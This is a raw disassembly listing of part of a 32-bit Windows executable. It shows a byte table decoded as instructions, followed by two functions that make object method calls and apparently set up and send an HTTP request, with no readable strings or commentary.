  408f85:	47                   	inc    %edi
  408f86:	47                   	inc    %edi
  408f87:	47                   	inc    %edi
  408f88:	08 09                	or     %cl,(%ecx)
  408f8a:	0a 0b                	or     (%ebx),%cl
  408f8c:	0c 0d                	or     $0xd,%al
  408f8e:	0e                   	push   %cs
  408f8f:	0f 10 11             	movups (%ecx),%xmm2
  408f92:	47                   	inc    %edi
  408f93:	47                   	inc    %edi
  408f94:	12 13                	adc    (%ebx),%dl
  408f96:	14 15                	adc    $0x15,%al
  408f98:	16                   	push   %ss
  408f99:	17                   	pop    %ss
  408f9a:	18 19                	sbb    %bl,(%ecx)
  408f9c:	1a 1b                	sbb    (%ebx),%bl
  408f9e:	1c 1d                	sbb    $0x1d,%al
  408fa0:	1e                   	push   %ds
  408fa1:	1f                   	pop    %ds
  408fa2:	47                   	inc    %edi
  408fa3:	47                   	inc    %edi
  408fa4:	47                   	inc    %edi
  408fa5:	47                   	inc    %edi
  408fa6:	47                   	inc    %edi
  408fa7:	47                   	inc    %edi
  408fa8:	47                   	inc    %edi
  408fa9:	47                   	inc    %edi
  408faa:	47                   	inc    %edi
  408fab:	47                   	inc    %edi
  408fac:	47                   	inc    %edi
  408fad:	47                   	inc    %edi
  408fae:	47                   	inc    %edi
  408faf:	47                   	inc    %edi
  408fb0:	47                   	inc    %edi
  408fb1:	47                   	inc    %edi
  408fb2:	47                   	inc    %edi
  408fb3:	47                   	inc    %edi
  408fb4:	47                   	inc    %edi
  408fb5:	47                   	inc    %edi
  408fb6:	47                   	inc    %edi
  408fb7:	47                   	inc    %edi
  408fb8:	47                   	inc    %edi
  408fb9:	47                   	inc    %edi
  408fba:	47                   	inc    %edi
  408fbb:	47                   	inc    %edi
  408fbc:	47                   	inc    %edi
  408fbd:	47                   	inc    %edi
  408fbe:	47                   	inc    %edi
  408fbf:	47                   	inc    %edi
  408fc0:	47                   	inc    %edi
  408fc1:	47                   	inc    %edi
  408fc2:	47                   	inc    %edi
  408fc3:	20 20                	and    %ah,(%eax)
  408fc5:	47                   	inc    %edi
  408fc6:	47                   	inc    %edi
  408fc7:	47                   	inc    %edi
  408fc8:	21 22                	and    %esp,(%edx)
  408fca:	23 24 25 26 27 28 29 	and    0x29282726(,%eiz,1),%esp
  408fd1:	2a 2b                	sub    (%ebx),%ch
  408fd3:	2c 47                	sub    $0x47,%al
  408fd5:	2d 2e 2f 30 31       	sub    $0x31302f2e,%eax
  408fda:	32 33                	xor    (%ebx),%dh
  408fdc:	34 35                	xor    $0x35,%al
  408fde:	36 37                	ss aaa
  408fe0:	38 39                	cmp    %bh,(%ecx)
  408fe2:	3a 3b                	cmp    (%ebx),%bh
  408fe4:	47                   	inc    %edi
  408fe5:	47                   	inc    %edi
  408fe6:	47                   	inc    %edi
  408fe7:	47                   	inc    %edi
  408fe8:	47                   	inc    %edi
  408fe9:	47                   	inc    %edi
  408fea:	47                   	inc    %edi
  408feb:	47                   	inc    %edi
  408fec:	47                   	inc    %edi
  408fed:	47                   	inc    %edi
  408fee:	47                   	inc    %edi
  408fef:	47                   	inc    %edi
  408ff0:	47                   	inc    %edi
  408ff1:	47                   	inc    %edi
  408ff2:	47                   	inc    %edi
  408ff3:	47                   	inc    %edi
  408ff4:	47                   	inc    %edi
  408ff5:	47                   	inc    %edi
  408ff6:	47                   	inc    %edi
  408ff7:	47                   	inc    %edi
  408ff8:	47                   	inc    %edi
  408ff9:	47                   	inc    %edi
  408ffa:	47                   	inc    %edi
  408ffb:	47                   	inc    %edi
  408ffc:	47                   	inc    %edi
  408ffd:	47                   	inc    %edi
  408ffe:	47                   	inc    %edi
  408fff:	47                   	inc    %edi
  409000:	47                   	inc    %edi
  409001:	47                   	inc    %edi
  409002:	47                   	inc    %edi
  409003:	47                   	inc    %edi
  409004:	47                   	inc    %edi
  409005:	47                   	inc    %edi
  409006:	47                   	inc    %edi
  409007:	47                   	inc    %edi
  409008:	47                   	inc    %edi
  409009:	47                   	inc    %edi
  40900a:	47                   	inc    %edi
  40900b:	47                   	inc    %edi
  40900c:	47                   	inc    %edi
  40900d:	47                   	inc    %edi
  40900e:	47                   	inc    %edi
  40900f:	47                   	inc    %edi
  409010:	47                   	inc    %edi
  409011:	47                   	inc    %edi
  409012:	47                   	inc    %edi
  409013:	47                   	inc    %edi
  409014:	47                   	inc    %edi
  409015:	47                   	inc    %edi
  409016:	47                   	inc    %edi
  409017:	47                   	inc    %edi
  409018:	47                   	inc    %edi
  409019:	47                   	inc    %edi
  40901a:	47                   	inc    %edi
  40901b:	47                   	inc    %edi
  40901c:	47                   	inc    %edi
  40901d:	47                   	inc    %edi
  40901e:	47                   	inc    %edi
  40901f:	47                   	inc    %edi
  409020:	47                   	inc    %edi
  409021:	47                   	inc    %edi
  409022:	3c 3d                	cmp    $0x3d,%al
  409024:	3e 3f                	ds aas
  409026:	40                   	inc    %eax
  409027:	41                   	inc    %ecx
  409028:	42                   	inc    %edx
  409029:	47                   	inc    %edi
  40902a:	47                   	inc    %edi
  40902b:	47                   	inc    %edi
  40902c:	47                   	inc    %edi
  40902d:	47                   	inc    %edi
  40902e:	47                   	inc    %edi
  40902f:	47                   	inc    %edi
  409030:	47                   	inc    %edi
  409031:	47                   	inc    %edi
  409032:	47                   	inc    %edi
  409033:	47                   	inc    %edi
  409034:	47                   	inc    %edi
  409035:	47                   	inc    %edi
  409036:	47                   	inc    %edi
  409037:	47                   	inc    %edi
  409038:	47                   	inc    %edi
  409039:	47                   	inc    %edi
  40903a:	47                   	inc    %edi
  40903b:	47                   	inc    %edi
  40903c:	47                   	inc    %edi
  40903d:	47                   	inc    %edi
  40903e:	47                   	inc    %edi
  40903f:	47                   	inc    %edi
  409040:	47                   	inc    %edi
  409041:	47                   	inc    %edi
  409042:	47                   	inc    %edi
  409043:	43                   	inc    %ebx
  409044:	44                   	inc    %esp
  409045:	45                   	inc    %ebp
  409046:	46                   	inc    %esi
  409047:	ff 15 e0 10 40 00    	call   *0x4010e0
  40904d:	90                   	nop
  40904e:	90                   	nop
  40904f:	90                   	nop
  409050:	55                   	push   %ebp
  409051:	8b ec                	mov    %esp,%ebp
  409053:	83 ec 0c             	sub    $0xc,%esp
  409056:	68 a6 14 40 00       	push   $0x4014a6
  40905b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  409061:	50                   	push   %eax
  409062:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  409069:	83 ec 24             	sub    $0x24,%esp
  40906c:	53                   	push   %ebx
  40906d:	56                   	push   %esi
  40906e:	57                   	push   %edi
  40906f:	89 65 f4             	mov    %esp,-0xc(%ebp)
  409072:	c7 45 f8 b8 13 40 00 	movl   $0x4013b8,-0x8(%ebp)
  409079:	8b 75 08             	mov    0x8(%ebp),%esi
  40907c:	8b c6                	mov    %esi,%eax
  40907e:	83 e0 01             	and    $0x1,%eax
  409081:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409084:	83 e6 fe             	and    $0xfffffffe,%esi
  409087:	56                   	push   %esi
  409088:	89 75 08             	mov    %esi,0x8(%ebp)
  40908b:	8b 0e                	mov    (%esi),%ecx
  40908d:	ff 51 04             	call   *0x4(%ecx)
  409090:	8b 16                	mov    (%esi),%edx
  409092:	33 c0                	xor    %eax,%eax
  409094:	56                   	push   %esi
  409095:	89 45 e8             	mov    %eax,-0x18(%ebp)
  409098:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40909b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40909e:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  4090a4:	8b 1d 50 10 40 00    	mov    0x401050,%ebx
  4090aa:	50                   	push   %eax
  4090ab:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4090ae:	50                   	push   %eax
  4090af:	ff d3                	call   *%ebx
  4090b1:	8b f8                	mov    %eax,%edi
  4090b3:	6a 00                	push   $0x0
  4090b5:	57                   	push   %edi
  4090b6:	8b 0f                	mov    (%edi),%ecx
  4090b8:	ff 91 14 01 00 00    	call   *0x114(%ecx)
  4090be:	85 c0                	test   %eax,%eax
  4090c0:	db e2                	fnclex
  4090c2:	7d 12                	jge    0x4090d6
  4090c4:	68 14 01 00 00       	push   $0x114
  4090c9:	68 38 30 40 00       	push   $0x403038
  4090ce:	57                   	push   %edi
  4090cf:	50                   	push   %eax
  4090d0:	ff 15 38 10 40 00    	call   *0x401038
  4090d6:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  4090d9:	ff 15 60 11 40 00    	call   *0x401160
  4090df:	8b 16                	mov    (%esi),%edx
  4090e1:	56                   	push   %esi
  4090e2:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  4090e8:	50                   	push   %eax
  4090e9:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4090ec:	50                   	push   %eax
  4090ed:	ff d3                	call   *%ebx
  4090ef:	8b 0e                	mov    (%esi),%ecx
  4090f1:	56                   	push   %esi
  4090f2:	8b f8                	mov    %eax,%edi
  4090f4:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  4090fa:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  4090fd:	50                   	push   %eax
  4090fe:	52                   	push   %edx
  4090ff:	ff d3                	call   *%ebx
  409101:	8b f0                	mov    %eax,%esi
  409103:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  409106:	51                   	push   %ecx
  409107:	56                   	push   %esi
  409108:	8b 06                	mov    (%esi),%eax
  40910a:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  409110:	85 c0                	test   %eax,%eax
  409112:	db e2                	fnclex
  409114:	7d 12                	jge    0x409128
  409116:	68 a0 00 00 00       	push   $0xa0
  40911b:	68 38 30 40 00       	push   $0x403038
  409120:	56                   	push   %esi
  409121:	50                   	push   %eax
  409122:	ff 15 38 10 40 00    	call   *0x401038
  409128:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40912b:	8b 37                	mov    (%edi),%esi
  40912d:	52                   	push   %edx
  40912e:	ff 15 14 10 40 00    	call   *0x401014
  409134:	50                   	push   %eax
  409135:	57                   	push   %edi
  409136:	ff 96 1c 01 00 00    	call   *0x11c(%esi)
  40913c:	85 c0                	test   %eax,%eax
  40913e:	db e2                	fnclex
  409140:	7d 12                	jge    0x409154
  409142:	68 1c 01 00 00       	push   $0x11c
  409147:	68 38 30 40 00       	push   $0x403038
  40914c:	57                   	push   %edi
  40914d:	50                   	push   %eax
  40914e:	ff 15 38 10 40 00    	call   *0x401038
  409154:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  409157:	ff 15 64 11 40 00    	call   *0x401164
  40915d:	8d 45 e0             	lea    -0x20(%ebp),%eax
  409160:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  409163:	50                   	push   %eax
  409164:	51                   	push   %ecx
  409165:	6a 02                	push   $0x2
  409167:	ff 15 20 10 40 00    	call   *0x401020
  40916d:	83 c4 0c             	add    $0xc,%esp
  409170:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  409177:	68 9c 91 40 00       	push   $0x40919c
  40917c:	eb 1d                	jmp    0x40919b
  40917e:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  409181:	ff 15 64 11 40 00    	call   *0x401164
  409187:	8d 55 e0             	lea    -0x20(%ebp),%edx
  40918a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40918d:	52                   	push   %edx
  40918e:	50                   	push   %eax
  40918f:	6a 02                	push   $0x2
  409191:	ff 15 20 10 40 00    	call   *0x401020
  409197:	83 c4 0c             	add    $0xc,%esp
  40919a:	c3                   	ret
  40919b:	c3                   	ret
  40919c:	8b 45 08             	mov    0x8(%ebp),%eax
  40919f:	50                   	push   %eax
  4091a0:	8b 08                	mov    (%eax),%ecx
  4091a2:	ff 51 08             	call   *0x8(%ecx)
  4091a5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4091a8:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4091ab:	5f                   	pop    %edi
  4091ac:	5e                   	pop    %esi
  4091ad:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4091b4:	5b                   	pop    %ebx
  4091b5:	8b e5                	mov    %ebp,%esp
  4091b7:	5d                   	pop    %ebp
  4091b8:	c2 04 00             	ret    $0x4
  4091bb:	90                   	nop
  4091bc:	90                   	nop
  4091bd:	90                   	nop
  4091be:	90                   	nop
  4091bf:	90                   	nop
  4091c0:	55                   	push   %ebp
  4091c1:	8b ec                	mov    %esp,%ebp
  4091c3:	83 ec 18             	sub    $0x18,%esp
  4091c6:	68 a6 14 40 00       	push   $0x4014a6
  4091cb:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4091d1:	50                   	push   %eax
  4091d2:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4091d9:	b8 78 00 00 00       	mov    $0x78,%eax
  4091de:	e8 bd 82 ff ff       	call   0x4014a0
  4091e3:	53                   	push   %ebx
  4091e4:	56                   	push   %esi
  4091e5:	57                   	push   %edi
  4091e6:	89 65 e8             	mov    %esp,-0x18(%ebp)
  4091e9:	c7 45 ec c8 13 40 00 	movl   $0x4013c8,-0x14(%ebp)
  4091f0:	8b 45 08             	mov    0x8(%ebp),%eax
  4091f3:	83 e0 01             	and    $0x1,%eax
  4091f6:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4091f9:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4091fc:	83 e1 fe             	and    $0xfffffffe,%ecx
  4091ff:	89 4d 08             	mov    %ecx,0x8(%ebp)
  409202:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  409209:	8b 55 08             	mov    0x8(%ebp),%edx
  40920c:	8b 02                	mov    (%edx),%eax
  40920e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  409211:	51                   	push   %ecx
  409212:	ff 50 04             	call   *0x4(%eax)
  409215:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40921c:	c7 45 fc 02 00 00 00 	movl   $0x2,-0x4(%ebp)
  409223:	6a ff                	push   $0xffffffff
  409225:	ff 15 4c 10 40 00    	call   *0x40104c
  40922b:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  409232:	8b 55 08             	mov    0x8(%ebp),%edx
  409235:	8b 02                	mov    (%edx),%eax
  409237:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40923a:	51                   	push   %ecx
  40923b:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  409241:	50                   	push   %eax
  409242:	8d 55 9c             	lea    -0x64(%ebp),%edx
  409245:	52                   	push   %edx
  409246:	ff 15 50 10 40 00    	call   *0x401050
  40924c:	89 45 90             	mov    %eax,-0x70(%ebp)
  40924f:	8d 45 b8             	lea    -0x48(%ebp),%eax
  409252:	50                   	push   %eax
  409253:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  409256:	8b 11                	mov    (%ecx),%edx
  409258:	8b 45 90             	mov    -0x70(%ebp),%eax
  40925b:	50                   	push   %eax
  40925c:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  409262:	db e2                	fnclex
  409264:	89 45 8c             	mov    %eax,-0x74(%ebp)
  409267:	83 7d 8c 00          	cmpl   $0x0,-0x74(%ebp)
  40926b:	7d 20                	jge    0x40928d
  40926d:	68 a0 00 00 00       	push   $0xa0
  409272:	68 38 30 40 00       	push   $0x403038
  409277:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40927a:	51                   	push   %ecx
  40927b:	8b 55 8c             	mov    -0x74(%ebp),%edx
  40927e:	52                   	push   %edx
  40927f:	ff 15 38 10 40 00    	call   *0x401038
  409285:	89 85 70 ff ff ff    	mov    %eax,-0x90(%ebp)
  40928b:	eb 0a                	jmp    0x409297
  40928d:	c7 85 70 ff ff ff 00 	movl   $0x0,-0x90(%ebp)
  409294:	00 00 00 
  409297:	8b 45 b8             	mov    -0x48(%ebp),%eax
  40929a:	50                   	push   %eax
  40929b:	68 74 31 40 00       	push   $0x403174
  4092a0:	ff 15 84 10 40 00    	call   *0x401084
  4092a6:	f7 d8                	neg    %eax
  4092a8:	1b c0                	sbb    %eax,%eax
  4092aa:	f7 d8                	neg    %eax
  4092ac:	f7 d8                	neg    %eax
  4092ae:	66 89 45 88          	mov    %ax,-0x78(%ebp)
  4092b2:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4092b5:	ff 15 64 11 40 00    	call   *0x401164
  4092bb:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  4092be:	ff 15 60 11 40 00    	call   *0x401160
  4092c4:	0f bf 4d 88          	movswl -0x78(%ebp),%ecx
  4092c8:	85 c9                	test   %ecx,%ecx
  4092ca:	0f 84 bb 02 00 00    	je     0x40958b
  4092d0:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  4092d7:	6a 00                	push   $0x0
  4092d9:	6a 00                	push   $0x0
  4092db:	6a 00                	push   $0x0
  4092dd:	6a 00                	push   $0x0
  4092df:	68 8c 26 40 00       	push   $0x40268c
  4092e4:	8d 55 b8             	lea    -0x48(%ebp),%edx
  4092e7:	52                   	push   %edx
  4092e8:	ff 15 24 11 40 00    	call   *0x401124
  4092ee:	50                   	push   %eax
  4092ef:	e8 a0 97 ff ff       	call   0x402a94
  4092f4:	89 45 94             	mov    %eax,-0x6c(%ebp)
  4092f7:	ff 15 34 10 40 00    	call   *0x401034
  4092fd:	8b 45 94             	mov    -0x6c(%ebp),%eax
  409300:	89 45 c8             	mov    %eax,-0x38(%ebp)
  409303:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  409306:	ff 15 64 11 40 00    	call   *0x401164
  40930c:	c7 45 fc 05 00 00 00 	movl   $0x5,-0x4(%ebp)
  409313:	6a 00                	push   $0x0
  409315:	6a 00                	push   $0x0
  409317:	6a 03                	push   $0x3
  409319:	68 74 31 40 00       	push   $0x403174
  40931e:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  409321:	51                   	push   %ecx
  409322:	ff 15 24 11 40 00    	call   *0x401124
  409328:	50                   	push   %eax
  409329:	68 74 31 40 00       	push   $0x403174
  40932e:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  409331:	52                   	push   %edx
  409332:	ff 15 24 11 40 00    	call   *0x401124
  409338:	50                   	push   %eax
  409339:	6a 50                	push   $0x50
  40933b:	68 58 26 40 00       	push   $0x402658
  409340:	8d 45 b8             	lea    -0x48(%ebp),%eax
  409343:	50                   	push   %eax
  409344:	ff 15 24 11 40 00    	call   *0x401124
  40934a:	50                   	push   %eax
  40934b:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  40934e:	51                   	push   %ecx
  40934f:	e8 8c 97 ff ff       	call   0x402ae0
  409354:	89 45 94             	mov    %eax,-0x6c(%ebp)
  409357:	ff 15 34 10 40 00    	call   *0x401034
  40935d:	8b 55 94             	mov    -0x6c(%ebp),%edx
  409360:	89 55 cc             	mov    %edx,-0x34(%ebp)
  409363:	8d 45 b0             	lea    -0x50(%ebp),%eax
  409366:	50                   	push   %eax
  409367:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  40936a:	51                   	push   %ecx
  40936b:	8d 55 b8             	lea    -0x48(%ebp),%edx
  40936e:	52                   	push   %edx
  40936f:	6a 03                	push   $0x3
  409371:	ff 15 08 11 40 00    	call   *0x401108
  409377:	83 c4 10             	add    $0x10,%esp
  40937a:	c7 45 fc 06 00 00 00 	movl   $0x6,-0x4(%ebp)
  409381:	8b 45 08             	mov    0x8(%ebp),%eax
  409384:	8b 08                	mov    (%eax),%ecx
  409386:	8b 55 08             	mov    0x8(%ebp),%edx
  409389:	52                   	push   %edx
  40938a:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  409390:	50                   	push   %eax
  409391:	8d 45 9c             	lea    -0x64(%ebp),%eax
  409394:	50                   	push   %eax
  409395:	ff 15 50 10 40 00    	call   *0x401050
  40939b:	89 45 90             	mov    %eax,-0x70(%ebp)
  40939e:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4093a1:	51                   	push   %ecx
  4093a2:	8b 55 90             	mov    -0x70(%ebp),%edx
  4093a5:	8b 02                	mov    (%edx),%eax
  4093a7:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4093aa:	51                   	push   %ecx
  4093ab:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4093b1:	db e2                	fnclex
  4093b3:	89 45 8c             	mov    %eax,-0x74(%ebp)
  4093b6:	83 7d 8c 00          	cmpl   $0x0,-0x74(%ebp)
  4093ba:	7d 20                	jge    0x4093dc
  4093bc:	68 a0 00 00 00       	push   $0xa0
  4093c1:	68 38 30 40 00       	push   $0x403038
  4093c6:	8b 55 90             	mov    -0x70(%ebp),%edx
  4093c9:	52                   	push   %edx
  4093ca:	8b 45 8c             	mov    -0x74(%ebp),%eax
  4093cd:	50                   	push   %eax
  4093ce:	ff 15 38 10 40 00    	call   *0x401038
  4093d4:	89 85 6c ff ff ff    	mov    %eax,-0x94(%ebp)
  4093da:	eb 0a                	jmp    0x4093e6
  4093dc:	c7 85 6c ff ff ff 00 	movl   $0x0,-0x94(%ebp)
  4093e3:	00 00 00 
  4093e6:	6a 00                	push   $0x0
  4093e8:	68 00 00 00 80       	push   $0x80000000
  4093ed:	6a 00                	push   $0x0
  4093ef:	6a 00                	push   $0x0
  4093f1:	68 00 2f 40 00       	push   $0x402f00
  4093f6:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  4093f9:	51                   	push   %ecx
  4093fa:	ff 15 24 11 40 00    	call   *0x401124
  409400:	50                   	push   %eax
  409401:	68 54 36 40 00       	push   $0x403654
  409406:	8b 55 b8             	mov    -0x48(%ebp),%edx
  409409:	52                   	push   %edx
  40940a:	ff 15 28 10 40 00    	call   *0x401028
  409410:	8b d0                	mov    %eax,%edx
  409412:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  409415:	ff 15 38 11 40 00    	call   *0x401138
  40941b:	50                   	push   %eax
  40941c:	68 b0 31 40 00       	push   $0x4031b0
  409421:	ff 15 28 10 40 00    	call   *0x401028
  409427:	8b d0                	mov    %eax,%edx
  409429:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  40942c:	ff 15 38 11 40 00    	call   *0x401138
  409432:	50                   	push   %eax
  409433:	8b 45 08             	mov    0x8(%ebp),%eax
  409436:	8b 48 38             	mov    0x38(%eax),%ecx
  409439:	51                   	push   %ecx
  40943a:	ff 15 28 10 40 00    	call   *0x401028
  409440:	8b d0                	mov    %eax,%edx
  409442:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  409445:	ff 15 38 11 40 00    	call   *0x401138
  40944b:	50                   	push   %eax
  40944c:	8d 55 a4             	lea    -0x5c(%ebp),%edx
  40944f:	52                   	push   %edx
  409450:	ff 15 24 11 40 00    	call   *0x401124
  409456:	50                   	push   %eax
  409457:	68 7c 31 40 00       	push   $0x40317c
  40945c:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40945f:	50                   	push   %eax
  409460:	ff 15 24 11 40 00    	call   *0x401124
  409466:	50                   	push   %eax
  409467:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40946a:	51                   	push   %ecx
  40946b:	e8 08 97 ff ff       	call   0x402b78
  409470:	89 45 94             	mov    %eax,-0x6c(%ebp)
  409473:	ff 15 34 10 40 00    	call   *0x401034
  409479:	8b 55 94             	mov    -0x6c(%ebp),%edx
  40947c:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  40947f:	8d 45 a0             	lea    -0x60(%ebp),%eax
  409482:	50                   	push   %eax
  409483:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  409486:	51                   	push   %ecx
  409487:	8d 55 a8             	lea    -0x58(%ebp),%edx
  40948a:	52                   	push   %edx
  40948b:	8d 45 ac             	lea    -0x54(%ebp),%eax
  40948e:	50                   	push   %eax
  40948f:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  409492:	51                   	push   %ecx
  409493:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  409496:	52                   	push   %edx
  409497:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40949a:	50                   	push   %eax
  40949b:	6a 07                	push   $0x7
  40949d:	ff 15 08 11 40 00    	call   *0x401108
  4094a3:	83 c4 20             	add    $0x20,%esp
  4094a6:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  4094a9:	ff 15 60 11 40 00    	call   *0x401160
  4094af:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
  4094b6:	6a 00                	push   $0x0
  4094b8:	6a 00                	push   $0x0
  4094ba:	ff 15 00 10 40 00    	call   *0x401000
  4094c0:	8b d0                	mov    %eax,%edx
  4094c2:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  4094c5:	ff 15 38 11 40 00    	call   *0x401138
  4094cb:	50                   	push   %eax
  4094cc:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4094cf:	51                   	push   %ecx
  4094d0:	ff 15 24 11 40 00    	call   *0x401124
  4094d6:	50                   	push   %eax
  4094d7:	6a 00                	push   $0x0
  4094d9:	6a 00                	push   $0x0
  4094db:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  4094de:	52                   	push   %edx
  4094df:	e8 e0 96 ff ff       	call   0x402bc4
  4094e4:	66 89 45 98          	mov    %ax,-0x68(%ebp)
  4094e8:	ff 15 34 10 40 00    	call   *0x401034
  4094ee:	0f bf 45 98          	movswl -0x68(%ebp),%eax
  4094f2:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4094f5:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4094f8:	51                   	push   %ecx
  4094f9:	8d 55 b8             	lea    -0x48(%ebp),%edx
  4094fc:	52                   	push   %edx
  4094fd:	6a 02                	push   $0x2
  4094ff:	ff 15 08 11 40 00    	call   *0x401108
  409505:	83 c4 0c             	add    $0xc,%esp
  409508:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  40950f:	83 7d d0 00          	cmpl   $0x0,-0x30(%ebp)
  409513:	74 76                	je     0x40958b
  409515:	c7 45 fc 09 00 00 00 	movl   $0x9,-0x4(%ebp)
  40951c:	8b 45 08             	mov    0x8(%ebp),%eax
  40951f:	8b 08                	mov    (%eax),%ecx
  409521:	8b 55 08             	mov    0x8(%ebp),%edx
  409524:	52                   	push   %edx
  409525:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  40952b:	50                   	push   %eax
  40952c:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40952f:	50                   	push   %eax
  409530:	ff 15 50 10 40 00    	call   *0x401050
  409536:	89 45 90             	mov    %eax,-0x70(%ebp)
  409539:	68 74 31 40 00       	push   $0x403174
  40953e:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  409541:	8b 11                	mov    (%ecx),%edx
  409543:	8b 45 90             	mov    -0x70(%ebp),%eax
  409546:	50                   	push   %eax
  409547:	ff 92 a4 00 00 00    	call   *0xa4(%edx)
  40954d:	db e2                	fnclex
  40954f:	89 45 8c             	mov    %eax,-0x74(%ebp)
  409552:	83 7d 8c 00          	cmpl   $0x0,-0x74(%ebp)
  409556:	7d 20                	jge    0x409578
  409558:	68 a4 00 00 00       	push   $0xa4
  40955d:	68 38 30 40 00       	push   $0x403038
  409562:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  409565:	51                   	push   %ecx
  409566:	8b 55 8c             	mov    -0x74(%ebp),%edx
  409569:	52                   	push   %edx
  40956a:	ff 15 38 10 40 00    	call   *0x401038
  409570:	89 85 68 ff ff ff    	mov    %eax,-0x98(%ebp)
  409576:	eb 0a                	jmp    0x409582
  409578:	c7 85 68 ff ff ff 00 	movl   $0x0,-0x98(%ebp)
  40957f:	00 00 00 
  409582:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  409585:	ff 15 60 11 40 00    	call   *0x401160
  40958b:	c7 45 fc 0c 00 00 00 	movl   $0xc,-0x4(%ebp)
  409592:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  409595:	50                   	push   %eax
  409596:	e8 75 96 ff ff       	call   0x402c10
  40959b:	ff 15 34 10 40 00    	call   *0x401034
  4095a1:	c7 45 fc 0d 00 00 00 	movl   $0xd,-0x4(%ebp)
  4095a8:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4095ab:	51                   	push   %ecx
  4095ac:	e8 5f 96 ff ff       	call   0x402c10
  4095b1:	ff 15 34 10 40 00    	call   *0x401034
  4095b7:	c7 45 fc 0e 00 00 00 	movl   $0xe,-0x4(%ebp)
  4095be:	8b 55 cc             	mov    -0x34(%ebp),%edx
  4095c1:	52                   	push   %edx
  4095c2:	e8 49 96 ff ff       	call   0x402c10
  4095c7:	ff 15 34 10 40 00    	call   *0x401034
  4095cd:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4095d4:	68 0d 96 40 00       	push   $0x40960d
  4095d9:	eb 31                	jmp    0x40960c
  4095db:	8d 45 a0             	lea    -0x60(%ebp),%eax
  4095de:	50                   	push   %eax
  4095df:	8d 4d a4             	lea    -0x5c(%ebp),%ecx
  4095e2:	51                   	push   %ecx
  4095e3:	8d 55 a8             	lea    -0x58(%ebp),%edx
  4095e6:	52                   	push   %edx
  4095e7:	8d 45 ac             	lea    -0x54(%ebp),%eax
  4095ea:	50                   	push   %eax
  4095eb:	8d 4d b0             	lea    -0x50(%ebp),%ecx
  4095ee:	51                   	push   %ecx
  4095ef:	8d 55 b4             	lea    -0x4c(%ebp),%edx
  4095f2:	52                   	push   %edx
  4095f3:	8d 45 b8             	lea    -0x48(%ebp),%eax
  4095f6:	50                   	push   %eax
  4095f7:	6a 07                	push   $0x7
  4095f9:	ff 15 08 11 40 00    	call   *0x401108
  4095ff:	83 c4 20             	add    $0x20,%esp
